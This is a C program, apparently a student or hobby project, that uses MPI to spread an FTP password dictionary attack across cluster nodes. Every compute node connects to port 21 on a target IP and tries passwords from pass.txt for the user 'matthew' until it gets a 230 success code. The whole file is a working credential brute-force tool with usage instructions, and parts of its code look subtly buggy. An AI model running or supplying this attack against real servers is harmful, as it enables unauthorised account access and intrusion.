#include <mpi.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
int main(int argc, char *argv[]){
   
    //When running, make sure to have arg 1 be the target IP address
    //Make sure to change USER below to the ftp user you are testing against

    //Usage: ./dictionary-attack 192.168.1.15

    char c[1000];
    int increment_size,i,startpoint,endpoint;
    char mypass[100];
    FILE *file;
    int lines = 0;
    int sockfd = 0, n = 0;
    char recvBuff[1024];
    struct sockaddr_in serv_addr;

    //running with ftp user "matthew" change for different user
    char mesUser[100]="USER matthew\n";
    char mesPass[100];
    char meStor[100]="STOR xx\n";
    char mesPasv[100]="PASV \n";
    char dest[256];
    char ch[1000];
    int sz;

    //open password file to get the length 
    file = fopen("pass.txt", "r");
    while(fgets(c,1000,file) != NULL)
    {
       lines++;
    }
    fclose(file);


    // MPI init
    MPI_Init(NULL, NULL);

    int world_size;
    MPI_Comm_size(MPI_COMM_WORLD, &world_size);

    int world_rank;
    MPI_Comm_rank(MPI_COMM_WORLD, &world_rank);

    increment_size = lines / (world_size-1);

    // send start point and end point to compute nodes if on the master node
    if (world_rank==0){
	startpoint = 0;
        endpoint= increment_size;
	for(i=1; i<world_size; i++){
	    MPI_Send(&startpoint, 1, MPI_INT, i, 0, MPI_COMM_WORLD);
	    MPI_Send(&endpoint, 1, MPI_INT, i, 0, MPI_COMM_WORLD);
            startpoint = endpoint + 1;
            if (i == world_size-2){
               endpoint = lines;
            }
            else {
               endpoint = endpoint + increment_size;
            }
	}
    }
    //runs on the compute nodes
    //compute nodes recv start point and end point and then perform the attack
    else{ 
	MPI_Recv(&startpoint, 1, MPI_INT, 0, 0, MPI_COMM_WORLD,MPI_STATUS_IGNORE);
	MPI_Recv(&endpoint, 1, MPI_INT, 0, 0, MPI_COMM_WORLD,MPI_STATUS_IGNORE);

     file = fopen("pass.txt", "r");

     if (file) {

       if (startpoint != 0){
           //get to starting point
           for (i=0;fgets(c,1000,file) != NULL && i<startpoint; i++){
           
	   }       
       }
      for (i=0; fgets(c,1000,file) != NULL && i<endpoint; i++){
         //printf("Starting point is: %d, Ending point is: %d, Current pass is: %s\n",startpoint, endpoint,mypass);
         strcpy(mesPass, "PASS " );
         strcpy(mypass,c);
         strcat(mesPass, mypass);
         strcat(mesPass,"\n");
         memset(recvBuff, '0',sizeof(recvBuff));

    if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        printf("\n Error : Could not create socket \n");
        return 1;
    }


    memset(&serv_addr, '0', sizeof(serv_addr));

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(21);

    if(inet_pton(AF_INET, argv[1], &serv_addr.sin_addr)<=0)
     {
     printf("%s", argv[1]);
     printf("%d",inet_pton(AF_INET, argv[1], &serv_addr.sin_addr));
     printf("\n inet_pton error occured\n");
     return 1;
     }

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
    {
        printf("\n Error : Connect Failed \n");
        return 1;
    }

    //send username
    if ( send(sockfd , mesUser , strlen(mesUser) , 0) < 0)
    {
        perror("send failed");
        return 1;
    }

    //send current password in the list
    if ( send(sockfd , mesPass , strlen(mesPass) , 0) < 0)
    {
        perror("send failed");
        return 1;
    }

        char buffer[100];
        write(sockfd,buffer,100);




        size_t nbytes;
        ssize_t bytes_read;
        nbytes = sizeof(recvBuff-1);
        bytes_read = read(sockfd, recvBuff, nbytes);
        printf("Attempting login with password: %s", mypass);

    while ( (n = read(sockfd, recvBuff, sizeof(recvBuff)-1)) > 0)
    {
        recvBuff[n] = 0;
        strncpy(dest,recvBuff, 3);
        if (strcmp(dest,"530") == 0)
        {
            //demo print statement to show what compute nodes are running which password attempts
            //printf("      FAILED at rank %i\n",world_rank);
            break;
        }
        if (strcmp(dest,"230") == 0)
        {
            printf("Login Successful with password: %s\n", mypass);
            return 0;
        }

    }
            printf("No password found");

      }
    fclose(file);
     }
    }


    // Finalize the MPI environment.
    MPI_Finalize();
}

